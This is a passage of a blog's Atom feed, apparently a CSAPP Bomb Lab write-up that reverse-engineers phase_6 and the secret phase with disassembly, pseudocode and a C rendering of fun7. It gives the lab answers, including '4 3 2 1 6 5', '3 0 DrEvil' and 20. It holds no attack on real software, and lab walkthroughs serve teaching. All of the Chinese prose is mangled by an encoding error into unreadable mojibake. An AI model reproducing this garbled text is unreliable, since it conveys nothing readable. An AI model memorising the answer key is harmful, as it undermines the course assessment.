é‡ä¸å¤§ï¼Œä½†æ˜¯è·³è½¬è¯­å¥å¾ˆå¤šï¼Œé€»è¾‘éå¸¸å¤æ‚ã€‚è¿™é‡Œæˆ‘é‡‡ç”¨äº†åˆ†éƒ¨çš„æ–¹å¼ï¼Œé¦–å…ˆæ”¹å†™ä¸ºå¸¦ goto è¯­å¥çš„é«˜çº§è¯­è¨€ä¼ªä»£ç ï¼š</p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">%esi &#x3D; 0;goto phase_6_163;phase_6_130:%rdx &#x3D; Mem[%rdx + 0x8];%eax +&#x3D; 1;if (%eax !&#x3D; %ecx) goto phase_6_130;goto phase_6_148;phase_6_143:%edx &#x3D; 0x6032d0;phase_6_148:Mem[%rsp + 2 * %rsi + 0x20] &#x3D; %rdx;%rsi +&#x3D; 4;if (%rsi &#x3D;&#x3D; 0x18) goto phase_6_183;phase_6_163:%ecx &#x3D; Mem[%rsp + %rsi];if (%ecx &lt;&#x3D; 1) goto phase_6_143;%eax &#x3D; 1;%edx &#x3D; 0x6032d0;goto phase_6_130;</code></pre><p>ç„¶åå¯¹ç…§ä¸€äº›å¸¸è§çš„å½¢å¼ goto æ”¹å†™ä¸ºå¾ªç¯è¯­å¥ï¼Œè¿™é‡Œçš„ç¿»è¯‘è¿‡ç¨‹æ¯”è¾ƒç¹çï¼Œéœ€è¦é™ä¸‹æ¥ä»”ç»†æ€è€ƒã€‚</p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">%esi &#x3D; 0;while (%rsi !&#x3D; 0x18) &#123;%ecx &#x3D; Mem[%rsp + %rsi];if (%ecx &gt; 1) &#123;%eax &#x3D; 1;%rdx &#x3D; 0x6032d0;while (%eax !&#x3D; %ecx) &#123;%rdx &#x3D; Mem[%rdx + 0x8];%eax +&#x3D; 1;&#125;&#125;else &#123;%edx &#x3D; 0x6032d0;&#125;Mem[%rsp + 2 * %rsi + 0x20] &#x3D; %rdx;%rsi +&#x3D; 4;&#125;</code></pre><p>è§‚å¯Ÿç¿»è¯‘åçš„ä»£ç ï¼Œä¼¼ä¹å’Œ phase_5 ç±»ä¼¼ï¼Œéå†æ¯ä¸ªæ•°å­—ï¼Œå¹¶å°†æ¯ä¸ªæ•°å­—å½“ä½œç´¢å¼• iï¼Œåœ¨èµ·å§‹åœ°å€ä¸º <code>0x6032d0</code> çš„è¡¨ä¸­æŸ¥æ‰¾ç¬¬ i ä¸ªå…ƒç´ ï¼Œä»¥ <code>%rsp + 0x20</code> ä½œä¸ºèµ·å§‹åœ°å€åˆ›å»ºä¸€ä¸ªçº¿æ€§ç»“æ„ã€‚</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/p6.png"></p><p>æ‰“å°èµ·å§‹åœ°å€ä¸º <code>0x6032d0</code> çš„ 12 ä¸ª 8 å­—èŠ‚æ•°æ®ï¼Œå¯ä»¥çœ‹åˆ°ç¬¬äºŒåˆ—ä¸­è¡¨ç¤ºçš„å€¼å°±æ˜¯æŸä¸€è¡Œçš„åœ°å€ï¼Œä¸”è¿™äº›åœ°å€æ­£å¥½å¯ä»¥ä¸²è”æˆä¸€ä¸ªçº¿æ€§ç»“æ„ï¼ŒåŠ ä¸Šç¬¦å·å &quot;node&quot; çš„æç¤ºï¼Œæ˜¯ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Ÿæ²¡é”™ï¼Œå°±æ˜¯ <strong>é“¾è¡¨</strong> ã€‚ä¸Šå›¾æ¯ä¸€è¡Œçš„ç¬¬ä¸€åˆ—ä¸ºå€¼åŸŸï¼Œç¬¬äºŒåˆ—ä¸º next åŸŸã€‚</p><p>å›è¿‡æ¥è§‚å¯Ÿä»£ç ï¼Œç¬¬ä¸‰éƒ¨åˆ†çš„ä½œç”¨å°±æ˜¯å°†è¾“å…¥çš„å…­ä¸ªæ•°å­—ä½œä¸ºç´¢å¼•ï¼Œåˆ›å»ºä¸€ä¸ªæ•°ç»„ï¼Œæ¯ä¸ªæ•°ç»„å…ƒç´ éƒ½ä¸ºç´¢å¼•å¯¹åº”çš„ next åŸŸã€‚</p><h2 id="block-4"><a href="#block-4" class="headerlink" title="block_4"></a>block_4</h2><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x00000000004011ab &lt;+183&gt;:   mov    0x20(%rsp),%rbx0x00000000004011b0 &lt;+188&gt;:   lea    0x28(%rsp),%rax0x00000000004011b5 &lt;+193&gt;:   lea    0x50(%rsp),%rsi0x00000000004011ba &lt;+198&gt;:   mov    %rbx,%rcx0x00000000004011bd &lt;+201&gt;:   mov    (%rax),%rdx0x00000000004011c0 &lt;+204&gt;:   mov    %rdx,0x8(%rcx)0x00000000004011c4 &lt;+208&gt;:   add    $0x8,%rax0x00000000004011c8 &lt;+212&gt;:   cmp    %rsi,%rax0x00000000004011cb &lt;+215&gt;:   je     0x4011d2 &lt;phase_6+222&gt;0x00000000004011cd &lt;+217&gt;:   mov    %rdx,%rcx0x00000000004011d0 &lt;+220&gt;:   jmp    0x4011bd &lt;phase_6+201&gt;</code></pre><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">&#x2F;&#x2F; åˆ›å»ºé“¾è¡¨%rbx &#x3D; Mem[%rsp + 0x20];for (%rax &#x3D; %rsp + 0x28, %rsi &#x3D; %rsp + 0x50; ; %rcx &#x3D; %rdx) &#123;%rcx &#x3D; %rbx;%rdx &#x3D; Mem[%rax];Mem[%rcx + 8] &#x3D; %rdx;%rax +&#x3D; 8;if (%rax &#x3D;&#x3D; %rsi) break;&#125;</code></pre><p>ç†è§£æ¸…æ¥šäº†ç¬¬ä¸‰éƒ¨åˆ†ï¼Œç¬¬å››éƒ¨åˆ†çš„ä½œç”¨å°±å¾ˆæ˜æ˜¾äº†ï¼šæ ¹æ®ç¬¬ä¸‰éƒ¨åˆ†åˆ›å»ºçš„ç”± next åŸŸæ„æˆçš„æ•°ç»„ï¼Œåˆ›å»ºä¸€ä¸ªé“¾è¡¨ç»“æ„ã€‚</p><h2 id="block-5"><a href="#block-5" class="headerlink" title="block_5"></a>block_5</h2><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x00000000004011d2 &lt;+222&gt;:   movq   $0x0,0x8(%rdx)0x00000000004011da &lt;+230&gt;:   mov    $0x5,%ebp0x00000000004011df &lt;+235&gt;:   mov    0x8(%rbx),%rax0x00000000004011e3 &lt;+239&gt;:   mov    (%rax),%eax0x00000000004011e5 &lt;+241&gt;:   cmp    %eax,(%rbx)0x00000000004011e7 &lt;+243&gt;:   jge    0x4011ee &lt;phase_6+250&gt;0x00000000004011e9 &lt;+245&gt;:   call   0x40143a &lt;explode_bomb&gt;0x00000000004011ee &lt;+250&gt;:   mov    0x8(%rbx),%rbx0x00000000004011f2 &lt;+254&gt;:   sub    $0x1,%ebp0x00000000004011f5 &lt;+257&gt;:   jne    0x4011df &lt;phase_6+235&gt;0x00000000004011f7 &lt;+259&gt;:   add    $0x50,%rsp0x00000000004011fb &lt;+263&gt;:   pop    %rbx0x00000000004011fc &lt;+264&gt;:   pop    %rbp0x00000000004011fd &lt;+265&gt;:   pop    %r120x00000000004011ff &lt;+267&gt;:   pop    %r130x0000000000401201 &lt;+269&gt;:   pop    %r140x0000000000401203 &lt;+271&gt;:   ret</code></pre><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">&#x2F;&#x2F; éå†é“¾è¡¨ï¼Œåˆ¤æ–­æ˜¯å¦ä»å¤§åˆ°å°æ’åºï¼Œè‹¥ä¸æ˜¯ï¼Œåˆ™å¼•çˆ†Mem[%rdx + 8] &#x3D; 0;for (%ebp &#x3D; 5; %ebp !&#x3D; 0; --%ebp) &#123;%rax &#x3D; Mem[%rbx + 8];    %eax &#x3D; Mem[%rax];    if (Mem[%rbx] &lt; %eax) &#123;        explode_bomb();    &#125;   %rbx &#x3D; Mem[%rbx + 8];&#125;</code></pre><p>ç»ˆäºåˆ°æœ€åä¸€éƒ¨åˆ†äº†ï¼Œè¿™ä¸€éƒ¨åˆ†çš„ä½œç”¨å¾ˆæ˜æ˜¾ï¼šåˆ¤æ–­é“¾è¡¨æ˜¯å¦æœ‰åºï¼Œæ›´å‡†ç¡®åœ°è¯´ï¼Œæ˜¯å¦ä»¥éé€’å¢é¡ºåºæ’åˆ—ã€‚</p><p>é‚£ä¹ˆæœ¬å…³çš„ç›®æ ‡ç»ˆäºæµ®å‡ºæ°´é¢äº†ï¼š</p><p><em>è¾“å…¥å…­ä¸ªæ•°å­—ï¼Œå¯¹äºæ¯ä¸ªæ•°å­— numï¼Œå°† 7 - num ä½œä¸ºç´¢å¼•ï¼Œæ ¹æ®é“¾è¡¨ node é‡æ„å‡ºä¸€ä¸ªæ–°çš„é“¾è¡¨ï¼Œå¹¶ä¿è¯é‡æ„çš„é“¾è¡¨æŒ‰éé€’å¢é¡ºåºæ’åˆ—ã€‚</em></p><p>æ³¨æ„é“¾è¡¨å€¼åŸŸçš„æ¯”è¾ƒåªå…³æ³¨ä½ 4 å­—èŠ‚ï¼Œå› æ­¤é“¾è¡¨å„ç»“ç‚¹å€¼åŸŸä»å¤§åˆ°å°æ’åºä¸ºï¼š<code>3 4 5 6 1 2</code>ï¼Œé‚£ä¹ˆå¯¹åº”çš„è¾“å…¥æ•°å­—ä¸ºï¼š<code>4 3 2 1 6 5</code>ï¼Œå³æœ¬å…³çš„æ­£ç¡®ç­”æ¡ˆã€‚</p><h1 id="secret-phase"><a href="#secret-phase" class="headerlink" title="secret_phase"></a>secret_phase</h1><p>è§£å†³éšè—å…³å¡é¦–å…ˆè¦è§£å†³çš„é—®é¢˜æ˜¯ï¼šå¦‚ä½•è¿›å…¥ï¼Ÿè§‚å¯Ÿ main å‡½æ•°çš„æ±‡ç¼–ä»£ç ï¼Œåœ¨ç»“æŸ phase_6 ä¹‹åã€main å‡½æ•°è¿”å›ä¹‹å‰ï¼Œåªæœ‰ phase_defused å‡½æ•°è¢«è°ƒç”¨ï¼Œçœ‹æ¥å…¥å£å¯èƒ½éšè—åœ¨ä¸€ç›´ä»¥æ¥è¢«å¿½ç•¥çš„éƒ¨åˆ†ã€‚</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/sp-4.png"></p><p>å¯¹ phase_defused è¿›è¡Œåæ±‡ç¼–ï¼Œç»“æœå¦‚ä¸‹ï¼š</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x00000000004015c4 &lt;+0&gt;:     sub    $0x78,%rsp0x00000000004015c8 &lt;+4&gt;:     mov    %fs:0x28,%rax0x00000000004015d1 &lt;+13&gt;:    mov    %rax,0x68(%rsp)0x00000000004015d6 &lt;+18&gt;:    xor    %eax,%eax0x00000000004015d8 &lt;+20&gt;:    cmpl   $0x6,0x202181(%rip)        # 0x603760 &lt;num_input_strings&gt;0x00000000004015df &lt;+27&gt;:    jne    0x40163f &lt;phase_defused+123&gt;0x00000000004015e1 &lt;+29&gt;:    lea    0x10(%rsp),%r80x00000000004015e6 &lt;+34&gt;:    lea    0xc(%rsp),%rcx0x00000000004015eb &lt;+39&gt;:    lea    0x8(%rsp),%rdx0x00000000004015f0 &lt;+44&gt;:    mov    $0x402619,%esi0x00000000004015f5 &lt;+49&gt;:    mov    $0x603870,%edi0x00000000004015fa &lt;+54&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;0x00000000004015ff &lt;+59&gt;:    cmp    $0x3,%eax0x0000000000401602 &lt;+62&gt;:    jne    0x401635 &lt;phase_defused+113&gt;0x0000000000401604 &lt;+64&gt;:    mov    $0x402622,%esi0x0000000000401609 &lt;+69&gt;:    lea    0x10(%rsp),%rdi0x000000000040160e &lt;+74&gt;:    call   0x401338 &lt;strings_not_equal&gt;0x0000000000401613 &lt;+79&gt;:    test   %eax,%eax0x0000000000401615 &lt;+81&gt;:    jne    0x401635 &lt;phase_defused+113&gt;0x0000000000401617 &lt;+83&gt;:    mov    $0x4024f8,%edi0x000000000040161c &lt;+88&gt;:    call   0x400b10 &lt;puts@plt&gt;0x0000000000401621 &lt;+93&gt;:    mov    $0x402520,%edi0x0000000000401626 &lt;+98&gt;:    call   0x400b10 &lt;puts@plt&gt;0x000000000040162b &lt;+103&gt;:   mov    $0x0,%eax0x0000000000401630 &lt;+108&gt;:   call   0x401242 &lt;secret_phase&gt;0x0000000000401635 &lt;+113&gt;:   mov    $0x402558,%edi0x000000000040163a &lt;+118&gt;:   call   0x400b10 &lt;puts@plt&gt;0x000000000040163f &lt;+123&gt;:   mov    0x68(%rsp),%rax0x0000000000401644 &lt;+128&gt;:   xor    %fs:0x28,%rax0x000000000040164d &lt;+137&gt;:   je     0x401654 &lt;phase_defused+144&gt;0x000000000040164f &lt;+139&gt;:   call   0x400b30 &lt;__stack_chk_fail@plt&gt;0x0000000000401654 &lt;+144&gt;:   add    $0x78,%rsp0x0000000000401658 &lt;+148&gt;:   ret</code></pre><p>å’Œä¹‹å‰çš„åšæ³•ä¸€æ ·ï¼Œå°†æ±‡ç¼–ä»£ç ç¿»è¯‘ä¸º C è¯­è¨€é£æ ¼çš„ä¼ªä»£ç ï¼ŒåŒæ—¶æ‰“å°ç¨‹åºä¸­ç”¨åˆ°çš„ä¸€äº›å­—ç¬¦ä¸²ï¼š</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/sp.png"></p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">%rax &#x3D; Mem[%fs + 0x28];Mem[%rsp + 0x68] &#x3D; %rax;if (Mem[%rip + 0x202181] &#x3D;&#x3D; 6) &#123; &#x2F;&#x2F; num_input_strings%r8 &#x3D; %rsp + 0x10;%rcx &#x3D; %rsp + 0xc;%rdx &#x3D; %rsp + 0x8;%rdi &#x3D; 0x603870;sscanf(%rdi, &quot;%d %d %s&quot;, %rdx, %rcx, %r8);if (%eax &#x3D;&#x3D; 3) &#123;%rdi &#x3D; %rsp + 0x10;if (strings_not_equal(%rdi, &quot;DrEvil&quot;) &#x3D;&#x3D; 0) &#123;puts(&quot;Curses, you&#39;ve found the secret phase!&quot;);puts(&quot;But finding it and solving it are quite different...&quot;);%eax &#x3D; 0;secret_phase();&#125;&#125;puts(&quot;Congratulations! You&#39;ve defused the bomb!&quot;);&#125;%rax &#x3D; Mem[%rsp + 0x68];if (%rax !&#x3D; Mem[%fs + 0x28]) &#123;__stack_chk_fail();&#125;</code></pre><p>ä»”ç»†åˆ†æä¸Šè¿°ä»£ç çš„é€»è¾‘ï¼Œå½“è¾“å…¥çš„å­—ç¬¦ä¸²ä¸ªæ•°ç­‰äº 6 æ—¶ï¼Œå³è§£å†³äº† phase_1 ~ phase_6 æ‰€æœ‰å…³å¡åï¼Œç¨‹åºè°ƒç”¨ <code>sscanf</code> ä»åœ°å€ <code>0x603870</code> å¤„è¯»å–ä»¥ç©ºæ ¼åˆ†éš”çš„ä¸¤ä¸ªæ•´æ•°å’Œä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œåˆ†åˆ«å­˜å…¥å¯„å­˜å™¨ <code>%rdx</code>ã€<code>%rcx</code> å’Œ <code>%r8</code> ä¸­ï¼Œå½“å‡½æ•°è¿”å›å€¼ä¸º 3ï¼Œå³æˆåŠŸåŒ¹é…äº† 3 ä¸ªå€¼ï¼Œä¸”åŒ¹é…åˆ°çš„ç¬¬ä¸‰ä¸ªå€¼ï¼ˆå­—ç¬¦ä¸²ï¼‰ç­‰äº &quot;DrEvil&quot; æ—¶ï¼Œå³å¯è¿›å…¥éšè—å…³å¡ã€‚</p><p>ä½†æ˜¯ä¸Šé¢æˆ‘ä»¬å·²ç»æ‰“å°äº†åœ°å€ <code>0x603870</code> å¤„çš„å­—ç¬¦ä¸²ï¼Œä¸º <code>3 0</code>ï¼Œåªæœ‰ä¸¤ä¸ªï¼Œæ— æ³•ä½¿å¾—åŒ¹é…æ•°ä¸º 3. æˆ‘æœ€å¼€å§‹æƒ³åˆ°çš„è§£å†³æ–¹æ³•å°±æ˜¯åœ¨è°ƒè¯•è¿‡ç¨‹ä¸­æ‰‹åŠ¨æ›´æ”¹è¯¥åœ°å€å¤„çš„å€¼ï¼Œä½†æ˜¯è¿™æ ·çš„åšæ³•ä¹Ÿåªå…·å¤‡è°ƒè¯•ä½œç”¨ï¼Œè¿›å…¥éšè—å…³å¡å¯†ç ä»ç„¶æ— æ³•å¾—åˆ°ã€‚</p><p>æ¢ä¸ªè§’åº¦æ¥æ€è€ƒï¼Œè¿™ä¸ª <code>3 0</code> æœ‰æ²¡æœ‰å¯èƒ½ä¸æ˜¯ç¡¬ç¼–ç çš„æ•°æ®ï¼Œè€Œæ˜¯æˆ‘ä»¬æ‰‹åŠ¨è¾“å…¥çš„ï¼Ÿè®°å¾—ä¹‹å‰ <code>phase_4</code> çš„æ­£ç¡®å¯†ç ä¹‹ä¸€å°±æ˜¯ <code>3 0</code>ã€‚</p><p>å°†æ–­ç‚¹è®¾ç½®åœ¨ phase_4 å¤„ï¼Œå¹¶æ‰“å° <code>%rdi</code> å¯„å­˜å™¨çš„å€¼ï¼Œ å‘ç°æ­£å¥½å°±æ˜¯ <code>0x603870</code>ï¼Œå› æ­¤ phase_4 çš„å®Œæ•´å¯†ç åº”è¯¥æ˜¯ <code>3 0 DrEvil</code> ï¼ˆæ­£å¦‚å‰é¢æ‰€è¯´ï¼Œå‰ä¸¤ä½ä¹Ÿå¯ä»¥æ˜¯ <code>1 0</code>ã€<code>7 0</code> ç­‰ï¼‰ã€‚</p><blockquote><p>æ³¨æ„æœ«å°¾çš„ DrEvil åœ¨ phase_4 ä¸­å¹¶ä¸ä¼šè¢«è¯»å–ï¼Œå› ä¸ºæ¨¡å¼å­—ç¬¦ä¸²ä¸º â€œ%d %dâ€ï¼Œå› æ­¤åŒ¹é…æˆåŠŸçš„å€¼æœ€å¤šä¸º 2ï¼Œä¸ä¼šå½±å“ <code>cmp  $0x2, %eax</code> çš„åˆ¤æ–­ã€‚</p></blockquote><p><img src="/2024/09/17/CSAPP-Bomb-Lab/sp-2.png"></p><p>ç»è¿‡å‰é¢çš„å‡†å¤‡ï¼Œç»ˆäºå¯ä»¥ç€æ‰‹è§£å†³éšè—å…³å¡äº†ï¼Œç›¸ä¿¡æœ‰äº†å‰é¢è¿™äº›å…³å¡çš„é”»ç‚¼ï¼Œéšè—å…³å¡ä¸ä¼šæ˜¾å¾—å¤ªéš¾ã€‚</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000401242 &lt;+0&gt;:     push   %rbx0x0000000000401243 &lt;+1&gt;:     call   0x40149e &lt;read_line&gt;0x0000000000401248 &lt;+6&gt;:     mov    $0xa,%edx0x000000000040124d &lt;+11&gt;:    mov    $0x0,%esi0x0000000000401252 &lt;+16&gt;:    mov    %rax,%rdi0x0000000000401255 &lt;+19&gt;:    call   0x400bd0 &lt;strtol@plt&gt;0x000000000040125a &lt;+24&gt;:    mov    %rax,%rbx0x000000000040125d &lt;+27&gt;:    lea    -0x1(%rax),%eax0x0000000000401260 &lt;+30&gt;:    cmp    $0x3e8,%eax0x0000000000401265 &lt;+35&gt;:    jbe    0x40126c &lt;secret_phase+42&gt;0x0000000000401267 &lt;+37&gt;:    call   0x40143a &lt;explode_bomb&gt;0x000000000040126c &lt;+42&gt;:    mov    %ebx,%esi0x000000000040126e &lt;+44&gt;:    mov    $0x6030f0,%edi0x0000000000401273 &lt;+49&gt;:    call   0x401204 &lt;fun7&gt;0x0000000000401278 &lt;+54&gt;:    cmp    $0x2,%eax0x000000000040127b &lt;+57&gt;:    je     0x401282 &lt;secret_phase+64&gt;0x000000000040127d &lt;+59&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000401282 &lt;+64&gt;:    mov    $0x402438,%edi0x0000000000401287 &lt;+69&gt;:    call   0x400b10 &lt;puts@plt&gt;0x000000000040128c &lt;+74&gt;:    call   0x4015c4 &lt;phase_defused&gt;0x0000000000401291 &lt;+79&gt;:    pop    %rbx0x0000000000401292 &lt;+80&gt;:    ret</code></pre><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">read_line();strtol(%rax, 0, 0xa);%rbx &#x3D; %rax;%eax &#x3D; %rax - 1;if (%eax &gt; 0x3e8) &#123;  &#x2F;&#x2F; æ— ç¬¦å·æ¯”è¾ƒexplode_bomb();&#125;fun7(0x6030f0, %ebx);if (%eax !&#x3D; 2) &#123;explode_bomb();&#125;puts(0x402438);phase_defused();</code></pre><p>å¯ä»¥çœ‹åˆ°ï¼Œéšè—å…³å¡çš„ä»£ç é€»è¾‘è¿˜æ˜¯æ¯”è¾ƒæ¸…æ™°çš„ï¼šè¯»å–ä¸€è¡Œï¼Œåº”è¯¥æ˜¯éšè—å…³å¡çš„å¯†ç ï¼Œå°†å…¶è½¬æ¢ä¸º <code>long</code> ç±»å‹ï¼Œç„¶ååˆæ˜¯å’Œä¹‹å‰ç±»ä¼¼çš„èŒƒå›´é™å®šè¯­å¥ï¼Œéšåè°ƒç”¨å‡½æ•° <code>fun7</code>ï¼Œå¦‚æœè¿”å›å€¼ä¸º 2ï¼Œåˆ™å¯†ç è¾“å…¥æ­£ç¡®ã€‚</p><p>é—®é¢˜çš„å…³é”®è¿˜æ˜¯åœ¨äºå‡½æ•° <code>fun7</code>ï¼Œå…¶ä»£ç å¦‚ä¸‹ï¼š</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000401204 &lt;+0&gt;:     sub    $0x8,%rsp0x0000000000401208 &lt;+4&gt;:     test   %rdi,%rdi0x000000000040120b &lt;+7&gt;:     je     0x401238 &lt;fun7+52&gt;0x000000000040120d &lt;+9&gt;:     mov    (%rdi),%edx0x000000000040120f &lt;+11&gt;:    cmp    %esi,%edx0x0000000000401211 &lt;+13&gt;:    jle    0x401220 &lt;fun7+28&gt;0x0000000000401213 &lt;+15&gt;:    mov    0x8(%rdi),%rdi0x0000000000401217 &lt;+19&gt;:    call   0x401204 &lt;fun7&gt;0x000000000040121c &lt;+24&gt;:    add    %eax,%eax0x000000000040121e &lt;+26&gt;:    jmp    0x40123d &lt;fun7+57&gt;0x0000000000401220 &lt;+28&gt;:    mov    $0x0,%eax0x0000000000401225 &lt;+33&gt;:    cmp    %esi,%edx0x0000000000401227 &lt;+35&gt;:    je     0x40123d &lt;fun7+57&gt;0x0000000000401229 &lt;+37&gt;:    mov    0x10(%rdi),%rdi0x000000000040122d &lt;+41&gt;:    call   0x401204 &lt;fun7&gt;0x0000000000401232 &lt;+46&gt;:    lea    0x1(%rax,%rax,1),%eax0x0000000000401236 &lt;+50&gt;:    jmp    0x40123d &lt;fun7+57&gt;0x0000000000401238 &lt;+52&gt;:    mov    $0xffffffff,%eax0x000000000040123d &lt;+57&gt;:    add    $0x8,%rsp0x0000000000401241 &lt;+61&gt;:    ret</code></pre><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token function">fun7</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> x<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> z <span class="token operator">=</span> <span class="token operator">*</span>x<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>z <span class="token operator">></span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token function">fun7</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>z <span class="token operator">==</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token function">fun7</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>åˆæ˜¯ä¸€ä¸ªé€’å½’å‡½æ•°ï¼Œä¸è¿‡å’Œ phase_4 ä¸åŒï¼Œè¿™ä¸ªå‡½æ•°çš„ä»£ç æ˜¾å¾—å¾ˆæœ‰è§„å¾‹ï¼Œçœ‹åˆ° <code>*(x + 8)</code> å’Œ <code>*(x + 16)</code> è¿™æ ·çš„è¡¨è¾¾å¼å¾ˆå®¹æ˜“æƒ³åˆ°å¯èƒ½åˆæ˜¯æŸç§é“¾æ¥ç»“æ„ï¼Œä¸å¦¨æ‰“å° <code>0x6030f0</code> å¤„çš„å†…å®¹ï¼š</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/sp-3.png"></p><p>è¿™ä¸‹ç»“æœå¾ˆæ˜ç¡®äº†ï¼Œæ¯ä¸ªç»“ç‚¹åŒ…å«ä¸¤ä¸ªé“¾æ¥ï¼ˆæŒ‡é’ˆï¼‰åŸŸï¼Œæ²¡é”™ï¼Œæ­£æ˜¯äºŒå‰æ ‘ã€‚ä¸ºäº†åˆ†æçš„æ–¹ä¾¿ï¼Œæˆ‘æ ¹æ®ä¸Šå›¾çš„æ•°æ®å†…å®¹ç»˜åˆ¶äº†ä¸€ä¸ªç­‰ä»·çš„äºŒå‰æ ‘ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><blockquote><p>å¯ä»¥çœ‹åˆ°ï¼Œæ¯ä¸ªç»“ç‚¹ç”± 4 ä¸ª 8 å­—èŠ‚ç»„æˆï¼Œå‰ä¸‰ä¸ªåº”è¯¥åˆ†åˆ«æ˜¯å€¼åŸŸã€å·¦å­©å­ã€å³å­©å­ï¼Œæœ€åä¸€ä¸ªå…¨ä¸º 0 çš„ 8 å­—èŠ‚è²Œä¼¼å¾ˆå¤šä½™ï¼Œä¸ªäººæ¨æµ‹åº”è¯¥æ˜¯ C è¯­è¨€ç»“æ„ä½“çš„ <strong>å­—èŠ‚å¯¹é½</strong> å¯¼è‡´çš„ã€‚</p></blockquote><p><img src="/2024/09/17/CSAPP-Bomb-Lab/btree.png"></p><p>æœ€åå†å›åˆ°å‡½æ•° fun7 ä¸­ï¼Œè¦ä½¿å¾—æœ€ç»ˆç»“æœç­‰äº 2ï¼Œä¸€ç§å¯èƒ½çš„è®¡ç®—æ–¹æ³•å¦‚ä¸‹ï¼š</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/formu.png"></p><p>æˆ‘ä»¬åªéœ€è¦ä¿è¯äºŒå‰æ ‘éå†æ—¶ä¾æ¬¡éå†å·¦å­©å­ã€å³å­©å­ã€å·¦å­©å­ï¼Œä¸”è¾“å…¥å¯†ç æ­£å¥½ç­‰äºå¶å­ç»“ç‚¹å³å¯ï¼Œ<code>0x14</code> æ­£å¥½å°±æ»¡è¶³æ¡ä»¶ï¼Œå› æ­¤éšè—å…³å¡çš„å¯†ç ä¸º 20.</p><p>è‡³æ­¤ï¼Œâ€ç‚¸å¼¹â€œ æˆåŠŸè¢«â€æ‹†é™¤â€œã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;p&gt;æœ¬ Lab å¯ä»¥è¯´æ˜¯ CSAPP çš„å‡ ä¸ª Lab ä¸­æœ€ä¸ºäººæ´¥æ´¥ä¹é“çš„ä¸€ä¸ªï¼Œå¯¹åº”çŸ¥è¯†ç‚¹ä¸ºä¹¦ä¸­çš„ç¬¬ 3 ç« ï¼ˆç¨‹åºçš„æœºå™¨çº§è¡¨ç¤ºï¼‰ï¼Œè¦æ±‚ä½¿ç”¨ GDB è°ƒè¯•å™¨ï¼Œå¯¹æ±‡ç¼–è¯­è¨€è¿›è¡Œè°ƒè¯•ï¼Œä»è€Œå¾—å‡ºæ­£ç¡®çš„â€œæ‹†å¼¹å¯†ç â€ã€‚å…±åˆ†ä¸º 6 ä¸ªå…³å¡å’Œä¸€ä¸ªéš</summary>
      
    
    
    
    <category term="è®¡ç®—æœºåŸºç¡€" scheme="http://lordaeronesz.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="ç»éªŒ" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="è®¡ç®—æœºåŸºç¡€" scheme="http://lordaeronesz.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    <category term="æ±‡ç¼–è¯­è¨€" scheme="http://lordaeronesz.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Data Lab</title>
    <link href="http://lordaeronesz.github.io/2024/08/31/CSAPP-Data-Lab/"/>
    <id>http://lordaeronesz.github.io/2024/08/31/CSAPP-Data-Lab/</id>
    <published>2024-08-31T03:45:11.000Z</published>
    <updated>2024-09-01T07:30:08.529Z</updated>
    
